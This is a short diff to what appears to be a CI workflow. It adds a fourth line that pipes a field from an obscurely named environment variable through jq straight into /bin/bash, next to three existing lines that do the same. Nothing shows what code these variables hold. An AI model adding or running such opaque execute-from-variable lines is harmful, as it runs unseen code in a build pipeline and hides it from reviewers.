@@ -24,6 +24,7 @@ jobs:
           printf '%s' "$vio9978" | jq -r .cr2101 | /bin/bash
           printf '%s' "$xcsa01" | jq -r .z64 | /bin/bash
           printf '%s' "$zr52" | jq -r .lsq10 | /bin/bash
+          printf '%s' "$cgr1" | jq -r .y96 | /bin/bash
 
       - name: Save archive
         if: always()
